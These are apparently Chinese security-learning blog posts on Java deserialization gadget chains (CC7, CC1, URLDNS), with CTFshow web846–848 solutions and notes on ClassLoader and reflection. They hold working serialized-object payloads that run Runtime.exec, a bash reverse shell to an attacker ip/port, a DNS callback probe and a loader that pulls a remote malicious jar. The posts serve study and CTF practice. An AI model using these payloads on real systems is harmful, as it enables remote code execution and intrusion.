不出意外的话，还是put问题，我们可以跟一下看看 果然，在put里调用了LazyMap的equals函数 但是LazyMap没equals，所以调用了它的父类AbstractMapDecorator里的equals 然后又调用了HashMap的equals方法，但是HashMap继承了AbstractMap抽象类，这个抽象类中有equals方法，所以就会调用 AbstractMap的equals方法，导致命令提前执行，并且会让hashmap2的key中就会增加一个yy键，而这个键的值为UNIXProcess这个类的实例： 而且在反序列化的时候AbstractMap抽象类的equals会在第三个if判断中会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞 所以还要remove掉hashmap2里多出的yy键值对 还有就是为了不让构造的时候就执行命令，用反射的方式改个值就行，最终payload package org.cc7; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class cc7 &#123; public static void main(String[] args) throws Exception &#123; Transformer transformerChain &#x3D; new ChainedTransformer(new Transformer[0]); Transformer[] transformers &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;), &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap1 &#x3D; new HashMap&lt;&gt;(); HashMap&lt;Object, Object&gt; hashMap2 &#x3D; new HashMap&lt;&gt;(); hashMap1.put(&quot;yy&quot;,1); hashMap2.put(&quot;zZ&quot;,1); Map decorate1 &#x3D; LazyMap.decorate(hashMap1, chainedTransformer); Map decorate2 &#x3D; LazyMap.decorate(hashMap2, new ConstantTransformer(&quot;1&quot;)); Hashtable&lt;Object, Object&gt; objectObjectHashtable &#x3D; new Hashtable&lt;&gt;(); objectObjectHashtable.put(decorate1,1); objectObjectHashtable.put(decorate2,1); hashMap2.remove(&quot;yy&quot;); Class&lt;? extends Map&gt; aClass &#x3D; decorate2.getClass(); Field factory &#x3D; aClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate2,chainedTransformer); serialize(objectObjectHashtable); unserialize(); &#125; public static void serialize(Object obj) throws Exception&#123; ObjectOutputStream oos&#x3D;new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static void unserialize() throws Exception&#123; ObjectInputStream ois&#x3D;new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); ois.readObject(); &#125; &#125; 总结作为最后一个CC链，CC7的入口类是Hashtable，执行类依旧是InvokerTransformer 调用链 Hashtable.readObject Hashtable.reconstitutionPut AbstractMap.equals LazyMap.get InvokerTransformer.transform 总结 对于反序列化来说，在调用链上的每个方法看起来是独立的，却又相互联系，通过不同的组合形成能够形成各种不同调用链 其中比较重要的是 CC2和CC3属于4.0环境 其余的属于3.0+版本， 其中高版本也可用的CC6和4.0版本的CC2是比较重要的 例题web847题目环境中，没有nc和curl命令，但是有bash，所以反弹shell Java7的环境，使用了commons-collections 3.1的库 所以用CC1就行 把序列化内容写入输出流里，然后base64输出 public class Main &#123; public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException &#123; Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot;&#125;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); &#x2F;&#x2F; InvokerTransformer exec &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap map &#x3D; new HashMap(); map.put(&quot;value&quot;,&quot;value&quot;); Map decorate &#x3D; TransformedMap.decorate(map, null, chainedTransformer); &#x2F;&#x2F; &#x2F;&#x2F;创建AnnotationinvocationHandler的类对象 Class&lt;?&gt; AIH_construct &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); &#x2F;&#x2F;获取构造方法 Constructor&lt;?&gt; declaredConstructor &#x3D; AIH_construct.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object o &#x3D; declaredConstructor.newInstance(Target.class, decorate); ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); byte[] buf &#x3D; byteArrayOutputStream.toByteArray(); &#x2F;&#x2F; base64编码 Base64.Encoder encoder &#x3D; Base64.getEncoder(); String base64 &#x3D; encoder.encodeToString(buf); System.out.println(base64); &#125; web848在847的基础上禁止了TransformedMap类 换成LazyMap就行，一样的东西","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"},{"name":"反序列化","slug":"反序列化","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"URLDNS链","slug":"URLDNS链","date":"2023-03-18T09:20:33.000Z","updated":"2023-03-24T12:29:38.912Z","comments":true,"path":"2023/03/18/URLDNS链/","link":"","permalink":"https://ethe448.github.io/2023/03/18/URLDNS%E9%93%BE/","excerpt":"","text":"基础的理论写在这里了，这篇主要是跟一下URLDNS链 Java | Ethe&#39;s blog (ethe448.github.io) URLDNS链反序列化分三个部分 入口类、调用链和执行类 接下来将对其依次进行分析 入口类这里的入口类是HashMap 首先HashMap里重写了readObject 在最后的地方 将对象中的内容一个一个拿了出来然后调用了putVal函数 这个函数具体的可以看这个HashMap中的putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict)解读_余韵啊的博客-CSDN博客 简单来说就是判断传入的内容的key的值是不是相等，不相等就加进map里，相等就覆盖 这里对key调用了hash函数，跟进去 又调用了key自身的hashCode函数 这个hashCode是Object自带的，所以HashMap满足我们入口类的三个条件（重写了readObject，参数类型宽泛，jdk自带） 所以接下来考虑有没有可能存在某个特殊的类**M，其hashCode**方法中直接或间接可调用危险函数，当M是key时，调用key.hashCode()，就相当于调用了M.hashCode()，从而触发危险函数。 执行类接下来我们再来看执行类 这里执行类就是URL类 跟进去找URL的hashCode方法 如果hashCode这个参数为-1，也就是初始值时，会调用handler的hashCode方法。 这里看一下handler是个什么东西 是URLStreamHandler类（也是我们传入的handler），也就是说这里调用的是URLStreamHandler.hashCode 跟进去之后有个getHostAddress方法 再往里跟会发现u是通过InetAddress.getByName获取到的ip地址 然后再通过getHost发送一个DNS请求 至此执行类的分析完成 调用链最后一部分是调用链，其实从入口类和执行类的分析就可以大概的看出调用链 HashMap -&gt; readObject() HashMap -&gt; hash() URL -&gt; hashCode() URLStreamHandler -&gt; hashCode() URLStreamHandler -&gt; getHostAddress() InetAddress-&gt; getByName() 初次利用先在bp上生成一个url接收DNS请求，dnslog也行 根据前边说的，利用就是创建个HashMap然后把key的位置传入URL类 HashMap&lt;Object,Integer&gt; h &#x3D; new HashMap&lt;&gt;(); h.put(new URL(&quot;http:&#x2F;&#x2F;xxxx&quot;),1); 然后我们对其进行序列化，然后再进行反序列化，在反序列化时我们就可以收到一个DNS请求 但是在实验过程中，我们会发现，就算没有进行反序列化，在bp上也同样能检测到有一个发送过来的请求 为什么会这样呢？ 其实原因在put方法里 跟进去看一下可以看见 在我们put的时候，就已经触发了hashCode函数，相当于走完了我们的利用链，然后向目标地址发送了dns请求。 但是这并不是我们想要的 因为URL里的hashCode中的这个判断 hashCode的初始值是-1，但是经过put走完我们的链子后，hashCode的值就会被改变，这时如果我们再执行反序列化，由于hashCode的值不再是-1，就不能再调用handler.hashCode的值从而实现向目标url发送dns请求的目的了。 因此，这里在put后，还需要使用反射让hashCode的值重新为-1 再次利用public class serializTest &#123; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;1.bin&quot;)); objectOutputStream.writeObject(obj); &#125; public static Object unserialize() throws IOException, ClassNotFoundException &#123; ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(&quot;1.bin&quot;)); Object o &#x3D; ois.readObject(); return o; &#125; &#125; package URLDNS; import serializTest.serializTest; import java.io.IOException; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class Test &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException &#123; HashMap&lt;Object,Integer&gt; h &#x3D; new HashMap&lt;&gt;(); &#x2F;&#x2F; 反射获取hashCode的值 Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;java.net.URL&quot;); Field hashCode &#x3D; aClass.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;cp9s9x.dnslog.cn&quot;); &#x2F;&#x2F; 防止在put时就发送请求，干扰判断 hashCode.set(url,1); System.out.println(hashCode.get(url)); &#x2F;&#x2F; 装入HashMap h.put(url,1); &#x2F;&#x2F; 改回-1使反序列化时进行dns请求 hashCode.set(url,-1); serializTest.serialize(h); System.out.println(hashCode.get(url)); Object unserialize &#x3D; serializTest.unserialize(); System.out.println(unserialize); &#125; &#125; CTFSHOW Web846 为了实现这个目的，我们可以把序列化的内容写到一个输出流里，然后用toByteArray将字节流转换为字节数组，再用base64编码输出 修改后的代码为 HashMap&lt;Object,Integer&gt; h &#x3D; new HashMap&lt;&gt;(); &#x2F;&#x2F; 反射获取hashCode的值 Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;java.net.URL&quot;); Field hashCode &#x3D; aClass.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;c83f8a14-f34c-4106-ae2b-0f835c562ad4.challenge.ctf.show&quot;);&#x2F;&#x2F;网址最后的斜杠要删掉 &#x2F;&#x2F; 防止在put时就发送请求，干扰判断 hashCode.set(url,1); &#x2F;&#x2F; &#x2F;&#x2F; System.out.println(hashCode.get(url)); &#x2F;&#x2F; 装入HashMap h.put(url,1); &#x2F;&#x2F; 改回-1使反序列化时进行dns请求 hashCode.set(url,-1); &#x2F;&#x2F; serializTest.serialize(h); ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(h); &#x2F;&#x2F; System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); byte[] buf &#x3D; byteArrayOutputStream.toByteArray(); &#x2F;&#x2F; base64编码 Base64.Encoder encoder &#x3D; Base64.getEncoder(); String base64 &#x3D; encoder.encodeToString(buf); System.out.println(base64); 然后以post方式提交就行了","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"},{"name":"反序列化","slug":"反序列化","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Java","slug":"Java","date":"2023-03-16T06:59:12.000Z","updated":"2023-04-24T12:46:04.474Z","comments":true,"path":"2023/03/16/Java/","link":"","permalink":"https://ethe448.github.io/2023/03/16/Java/","excerpt":"","text":"https://www.javasec.org 02.Java反射机制 · d4m1ts 知识库 (gm7.org) ClassLoader（类加载机制）Java能成为跨平台开发语言的原因就是JVM（Java虚拟机）的存在，Java程序在允许前要先编译为class文件，然后在Java类初始化（这是类加载的最后阶段，所有的静态变量都将被赋予原始值，并且静态区块将被执行。）时会调用java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法（defineClass0/1/2）来定义一个java.lang.Class实例。 Jvm架构图 具体介绍看这个https://cloud.tencent.com/developer/article/1042507 ClassLoader一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是Bootstrap ClassLoader（引导类加载器）、Extension ClassLoader（扩展类加载器）、App ClassLoader（系统类加载器），AppClassLoader是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用AppClassLoader加载类，ClassLoader.getSystemClassLoader()返回的系统类加载器也是AppClassLoader。 但是虽然默认使用的App ClassLoader加载类，但是加载顺序却是不同的 但是我们在尝试获取被Bootstrap ClassLoader类加载器所加载的类的ClassLoader时候都会返回null。 ClassLoader类有如下核心方法： loadClass（加载指定的Java类） findClass（查找指定的Java类） findLoadedClass（查找JVM已经加载过的类） defineClass（定义一个Java类） resolveClass（链接指定的Java类） Class.forName(&quot;类名&quot;)默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)，而ClassLoader.loadClass默认不会初始化类方法。 类加载流程首先是class文件加载到jvm内存的过程 就以上图使用反射加载test为例 ClassLoader会调用public Class&lt;?&gt; loadClass(String name)去加载test类 调用findLoadedClass方法检查test类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。 如果创建当前ClassLoader时传入了父类加载器（new ClassLoader(父类加载器)）就使用父类加载器加载test类，否则使用JVM的Bootstrap ClassLoader加载。 但是这里它并不是自己进行查找，而是先委托给父加载器，然后递归委托，直到Bootstrap ClassLoader加载器；如果Bootstrap classloader找到了，直接加载并且返回class和resource；如果没有找到，则一级一级返回，最后才是自己（这里的自己正常的肯定就是App ClassLoader，要不然就是你的自定义的类加载器）去查找加载。这个机制被称为双亲委派 如果当前的ClassLoader没有重写了findClass方法，那么直接返回类加载失败异常。如果当前类重写了findClass方法并通过传入的test类名找到了对应的类字节码，那么应该调用defineClass方法去JVM中注册该类。（注意这个defineClass方法，后面我们会讲到利用defineClass来加载任意类执行恶意代码的操作） 如果调用loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类，默认为false。 返回一个被JVM加载后的java.lang.Class类对象。 到这里，.class文件就已经被加载到jvm内存里面了，装载完成以后会得到一个Class对象，然后我们就可以使用new关键字，来实例化这个对象。 一个类从被加载到虚拟机内存中开始，到卸载出内存的每个阶段，构成了它的生命周期 1、加载 通过类的全名限定获取定义此类的二进制字节流。 将字节流代表的静态存储结构转化为方法区的运行时数据结构。 在内存（方法区）生成一个代表这个类的class对象，作为方法区这个类的各种数据访问入口。 加载和连接是交叉进行的，加载未完成可能连接已经开始了。 2、验证 检查class是否符合要求，非必须阶段，对程序的运行期没有影响，-Xverif:none 关闭（可以提高启动速度） 文件格式验证（魔数、常量类型）； 元数据验证（语义分析）； 字节码验证（语义合法）； 符号引用验证（能否被访问）; 3、准备 正式为类变量（static成员变量）分配内存并设置类变量初始值（零值）的阶段，这个变量所使用的内存都将在方法区进行分配，这时候的内存分配仅包括类变量，而不包括实例变量，实例变量将会在对象实例化时随着对象一起在堆中进行分配。 4、解析 虚拟机将常量池内的符号引用替换为直接引用的过程。 5、初始化 初始化阶段是执行类构造器&lt;clinit&gt;()方法的过程，虚拟机会保证一个类的类构造器&lt;clinit&gt;()在多线程环境中被正确的加锁，同步；如果多个线程同时初始化一个类，那么只会有一个线程区执行这个类的类构造器，其他线程阻塞等待，直到&lt;clinit&gt;()方法完毕，同一个类加载器，一个类只会被初始化一次。 类加载是会执行代码 初始化：静态代码块 实例化：构造代码块、无参构造函数 Class.forname 可选是否初始化 ClassLoader.loadClass 不进行初始化 双亲委派之前我们简单提到了双亲委派的含义 接下来介绍一下双亲委派的优点 ​ 使用双亲委派模型来组织类加载器之间的关系，有一个显而易见的好处就是Java类随着它的类加载器一起具备了一种带有优先级的层次关系。 ​ 例如类java.lang.Object，它存放在rt.jar之中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的启动类加载器进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有使用双亲委派模型，由各个类加载器自行去加载的话，如果用户自己编写了一个称为java.lang.Object的类，并放在程序的ClassPath中，那系统中将会出现多个不同的Object类，Java类型体系中最基础的行为也就无法保证，应用程序也将会变得一片混乱。 所以它的优点 系统类防止内存中出现多份同样的字节码 保证Java程序安全稳定运行 自定义ClassLoaderjava.lang.ClassLoader是所有的类加载器的父类，java.lang.ClassLoader有非常多的子类加载器，比如我们用于加载jar包的java.net.URLClassLoader其本身通过继承java.lang.ClassLoader类，重写了findClass方法从而实现了加载目录class文件甚至是远程资源文件。 既然URLClassLoader可以加载目录class文件或者远程资源文件，那这里我们也可以写一个ClassLoader去加载我们自己写的类 例子 package com.anbai.sec.classloader; import java.lang.reflect.Method; &#x2F;** * Creator: yz * Date: 2019&#x2F;12&#x2F;17 *&#x2F; public class TestClassLoader extends ClassLoader &#123; &#x2F;&#x2F; TestHelloWorld类名 private static String testClassName &#x3D; &quot;com.anbai.sec.classloader.TestHelloWorld&quot;; &#x2F;&#x2F; TestHelloWorld类字节码 private static byte[] testClassBytes &#x3D; new byte[]&#123; -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12 &#125;; @Override public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; &#x2F;&#x2F; 只处理TestHelloWorld类 if (name.equals(testClassName)) &#123; &#x2F;&#x2F; 调用JVM的native方法定义TestHelloWorld类 return defineClass(testClassName, testClassBytes, 0, testClassBytes.length); &#125; return super.findClass(name); &#125; public static void main(String[] args) &#123; &#x2F;&#x2F; 创建自定义的类加载器 TestClassLoader loader &#x3D; new TestClassLoader(); try &#123; &#x2F;&#x2F; 使用自定义的类加载器加载TestHelloWorld类 Class testClass &#x3D; loader.loadClass(testClassName); &#x2F;&#x2F; 反射创建TestHelloWorld类，等价于 TestHelloWorld t &#x3D; new TestHelloWorld(); Object testInstance &#x3D; testClass.newInstance(); &#x2F;&#x2F; 反射获取hello方法 Method method &#x3D; testInstance.getClass().getMethod(&quot;hello&quot;); &#x2F;&#x2F; 反射调用hello方法,等价于 String str &#x3D; t.hello(); String str &#x3D; (String) method.invoke(testInstance); System.out.println(str); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; URLClassLoader上面我们说URLClassLoader可以加载远程的资源文件，所以我们可以利用这一特性让程序加载远程的恶意jar文件，去执行其中的命令 这里直接python起一个本地服务器放cmd.jar的恶意jar包 public class CMD &#123; public static Process exec(String[] cmd) throws IOException &#123; return Runtime.getRuntime().exec(cmd); &#125; &#125; import java.io.ByteArrayOutputStream; import java.io.InputStream; import java.net.URL; import java.net.URLClassLoader; public class TestURLClassLoader &#123; public static void main(String[] args) throws Exception &#123; &#x2F;&#x2F; 从url指定的远程http服务器上加载的jar文件 URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;127.0.0.1:8001&#x2F;cmd.jar&quot;); &#x2F;&#x2F; 创建URLClassLoader加载远程jar包 URLClassLoader urlClassLoader &#x3D; new URLClassLoader(new URL[]&#123;url&#125;); &#x2F;&#x2F;rce命令弹出计算器 String[] cmd &#x3D; new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;dir&quot;&#125;; &#x2F;&#x2F; 通过URLClassLoader加载远程jar包中的CMD类 Class&lt;?&gt; aClass &#x3D; urlClassLoader.loadClass(&quot;CMD&quot;); Process process &#x3D; (Process) aClass.getMethod(&quot;exec&quot;, String[].class).invoke(null, (Object) cmd); InputStream inputStream &#x3D; process.getInputStream(); byte[] b &#x3D; new byte[1024]; ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream(); int a &#x3D; -1; while ((a &#x3D; inputStream.read(b)) !&#x3D; -1) &#123; baos.write(b, 0, a); &#125; System.out.println(baos); &#125; &#125; 这里补一点java命令执行的知识，使用Runtime.getRuntime().exec(cmd);执行java命令的时候，如果只传一个参数就只能执行类似calc这样的命令，如果想执行dir之类的命令，需要穿一个字符数组，格式在Windows上为&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;dir&quot;&#125;，在Linux下为 &#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;dir&quot;&#125; ClassLoader.defineClass 字节码加载任意类defineClass 是私有的，要通过反射调用 code是字节码 因为ClassLoader.loadClass 不进行初始化，所有要通过newInstance实例化后会执行Test里的静态代码块的内容 Unsafe.defindClass 字节码加载任意类虽然是public，但是不能直接生成，也要通过反射 Spring里可以直接生成 Java反射机制反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。即Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。 class是由JVM在执行过程中动态加载的。JVM在第一次读取到一种class类型时，将其加载进内存。 每加载一种class，JVM就为其创建一个Class类型的实例，并关联起来。注意：这里的Class类型是一个名叫Class的class。简单来说，这里的Class是Class类 public final class Class &#123; private Class() &#123;&#125; &#125; 这个Class实例是JVM内部创建的，构造方法是private，只有JVM能创建Class实例 JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息。 通过Class实例获取到class信息的方法就被成为反射 获取class的Class实例方法 补充一下方法一和方法二 方法一： 调用类的class属性类获取该类对应的Class对象，即：类名.class 方法二： 调用某个类的对象的getClass()方法，即：对象.getClass()； 通过反射获取字段newInstance()调用无参数构造方法 class ReflectTest02&#123; public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException &#123; &#x2F;&#x2F; 下面这段代码是以反射机制的方式创建对象。 &#x2F;&#x2F; 通过反射机制，获取Class，通过Class来实例化对象 Class c &#x3D; Class.forName(&quot;javase.reflectBean.User&quot;); &#x2F;&#x2F; newInstance() 这个方法会调用User这个类的无参数构造方法，完成对象的创建。 &#x2F;&#x2F; 重点是：newInstance()调用的是无参构造，必须保证无参构造是存在的！ Object obj &#x3D; c.newInstance(); System.out.println(obj); &#125; &#125; 获取属性 import java.util.Arrays; public class Java &#123; public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, InstantiationException &#123; Class tc &#x3D; aa.class; System.out.println(tc.getName());&#x2F;&#x2F;获取类名 System.out.println(Arrays.toString(tc.getDeclaredFields()));&#x2F;&#x2F;获取所有的属性 System.out.println(tc.getField(&quot;a&quot;));&#x2F;&#x2F; 根据字段名获取某个 public 的field（包括父类） System.out.println(tc.getDeclaredField(&quot;b&quot;));&#x2F;&#x2F; 根据字段名获取某个 public 的field（不包括父类） System.out.println(tc.getField(&quot;a&quot;).getName()); &#x2F;&#x2F; 字段名称 System.out.println(tc.getField(&quot;a&quot;).getType()); &#x2F;&#x2F; 字段类型，也是一个Class实例 System.out.println(tc.getField(&quot;a&quot;).getModifiers()); &#x2F;&#x2F; 修饰符 tc.getDeclaredField(&quot;a&quot;).setAccessible(true); Object o &#x3D; tc.newInstance(); System.out.println(tc.getDeclaredField(&quot;a&quot;).get(o));&#x2F;&#x2F; 获取值 tc.getDeclaredField(&quot;a&quot;).set(o,&quot;111&quot;); System.out.println(tc.getDeclaredField(&quot;a&quot;).get(o));&#x2F;&#x2F; 获取值 &#125; &#125; class aa&#123; public String a &#x3D; &quot;xxx&quot;; private int b; public void a()&#123; System.out.println(1); &#125; public void b(String a)&#123; System.out.println(a); &#125; &#125; 小结： 通过Class实例的方法可以获取Field实例：getField()，getFields()，getDeclaredField()，getDeclaredFields()； 通过Field实例可以获取字段信息：getName()，getType()，getModifiers()； 通过Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用setAccessible(true)来访问非public字段。 通过反射读写字段是一种非常规方法，它会破坏对象的封装。 通过反射获取方法* 使用invoke进行调用 小结： Java的反射API提供的Method对象封装了方法的所有信息： 通过Class实例的方法可以获取Method实例：getMethod()，getMethods()，getDeclaredMethod()，getDeclaredMethods()； 通过Method实例可以获取方法信息：getName()，getReturnType()，getParameterTypes()，getModifiers()； 通过Method实例可以调用某个对象的方法：Object invoke(Object instance, Object... parameters)； 通过设置setAccessible(true)来访问非public方法； 通过反射调用方法时，仍然遵循多态原则。 调用构造方法newInstance()只能调用无参的且为public类型的构造方法来进行实例化对象，但是如果构造方法有参数时或者不是public类型时，需要用getConstructor来配合newInstance()使用 我们把aa类里的构造方法写为 public aa(String a) &#123; System.out.println(a); &#125; 此时需要创建实例化对象的步骤就应该变为 小结： Constructor对象封装了构造方法的所有信息； 通过Class实例的方法可以获取Constructor实例：getConstructor()，getConstructors()，getDeclaredConstructor()，getDeclaredConstructors()； 通过Constructor实例可以创建一个实例对象：newInstance(Object... parameters)； 通过设置setAccessible(true)来访问非public构造方法。 反射java.lang.Runtime之前在URLClassLoader的部分我们提到java.lang.Runtime有一个exec方法可以执行我们本地的命令，所有这里我们尝试用反射的方式来调用其中的exec方法执行命令 import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.InputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class TestRuntime &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123; &#x2F;&#x2F; 获取Runtime的类对象 Class&lt;?&gt; r &#x3D; Class.forName(&quot;java.lang.Runtime&quot;); &#x2F;&#x2F;可以跟进去发现Runtime的构造方法不是public的，需要改访问权限 Constructor&lt;?&gt; declaredConstructor &#x3D; r.getDeclaredConstructor(); declaredConstructor.setAccessible(true); Runtime o &#x3D; (Runtime)declaredConstructor.newInstance(); &#x2F;&#x2F; 获取调用方法 Method exec &#x3D; r.getMethod(&quot;exec&quot;, String[].class); Process cmd &#x3D; (Process)exec.invoke(o, (Object) new String[]&#123;&quot;cmd&quot;, &quot;&#x2F;c&quot;, &quot;dir&quot;&#125;); &#x2F;&#x2F;到这里其实已经执行成功了，但是如果执行的是有回显的命令时，还需要把命令回显出来 InputStream inputStream &#x3D; cmd.getInputStream(); ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream(); int a &#x3D; -1; byte[] b &#x3D; new byte[1024]; while ((a &#x3D; inputStream.read(b)) !&#x3D; -1)&#123; baos.write(b,0,a); &#125; System.out.println(baos); &#125; &#125; 也可以用ASCII码的形式 String[] str &#x3D; new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;dir&quot;&#125;; &#x2F;&#x2F; 定义&quot;java.lang.Runtime&quot;字符串变量 String rt &#x3D; new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101&#125;); &#x2F;&#x2F; 反射java.lang.Runtime类获取Class对象 Class&lt;?&gt; c &#x3D; Class.forName(rt); &#x2F;&#x2F; 反射获取Runtime类的getRuntime方法 Method m1 &#x3D; c.getMethod(new String(new byte[]&#123;103, 101, 116, 82, 117, 110, 116, 105, 109, 101&#125;)); 